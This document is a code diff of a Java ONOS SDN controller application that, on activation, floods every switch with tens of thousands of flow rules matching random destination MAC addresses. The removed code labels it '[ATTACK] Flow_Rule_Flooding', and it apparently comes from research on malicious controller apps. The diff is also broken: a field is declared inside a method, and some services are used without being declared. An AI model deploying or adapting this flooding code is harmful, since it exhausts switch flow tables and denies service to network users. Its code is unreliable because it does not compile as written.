@@ -16,13 +16,19 @@
 package org.app8;
 
 import org.apache.felix.scr.annotations.*;
-import org.onosproject.app.ApplicationAdminService;
-import org.onosproject.core.Application;
-import org.onosproject.core.ApplicationId;
-import org.onosproject.core.CoreService;
+import org.onosproject.net.device.DeviceService;
+import org.onlab.packet.Ethernet;
+import org.onlab.packet.Ip4Prefix;
+import org.onlab.packet.IpAddress;
+import org.onlab.packet.MacAddress;
+import org.onosproject.net.flow.*;
+import org.onosproject.net.flowobjective.DefaultForwardingObjective;
+import org.onosproject.net.flowobjective.FlowObjectiveService;
+import org.onosproject.net.flowobjective.ForwardingObjective;
 import org.slf4j.Logger;
 import org.slf4j.LoggerFactory;
 
+import java.util.Random;
 import java.util.*;
 
 /**
@@ -31,29 +37,42 @@ import java.util.*;
 @Component(immediate = true)
 public class AppComponent {
 
+    @Reference(cardinality = ReferenceCardinality.MANDATORY_UNARY)
+    protected DeviceService deviceService;
+
+    @Reference(cardinality = ReferenceCardinality.MANDATORY_UNARY)
+    protected FlowRuleService flowRuleService;
+
+    @Property(name = "flowTimeout", intValue = DEFAULT_TIMEOUT, label = "Configure Flow Timeout for installed flow rules; ")
+    private int flowTimeout = DEFAULT_TIMEOUT;
+
+    private ApplicationId appId;
+
     private final Logger log = LoggerFactory.getLogger(getClass());
 
     @Activate
     protected void activate() {
-        log.info("Application 8 started : beginning flooding on switches");
+        log.info("Application 8 started : beginning flooding on switches {}", flowTimeout);
 
-        System.out.println("[ATTACK] Flow_Rule_Flooding");
+        appId = coreService.registerApplication("org.app8");
+
         TrafficTreatment.Builder treat = DefaultTrafficTreatment.builder();
         TrafficSelector.Builder selector = DefaultTrafficSelector.builder();
 
-        Iterable<Device> dv = deviceService.getDevices();
-        Iterator it = dv.iterator();
+        Iterable<Device> devices = deviceService.getDevices();
+        Iterator it = devices.iterator();
 
-        while (it.hasNext()) {
-            Device piece = (Device) it.next();
+        private Random random = new Random();
 
-            for (int i = 0; i < 32767; i++) {
-                selector.matchEthDst(MacAddress.valueOf(ran.nextLong()));
-                FlowRule newf = new DefaultFlowRule(piece.id(),
-                        selector.build(), treat.build(), ran.nextInt(32767),
-                        appId, flowTimeout, true, null);
+        while(it.hasNext())
+        {
+            Device device = (Device)it.next();
 
-                flowRuleService.applyFlowRules(newf);
+            for(int i=0; i<60000; i++)
+            {
+                selector.matchEthDst(MacAddress.valueOf(random.nextLong()));
+                FlowRule new_flow = new DefaultFlowRule(device.id(), selector.build(), treat.build(), 16000, appId, flowTimeout, true, null);
+                flowRuleService.applyFlowRules(new_flow);
             }
         }
     }
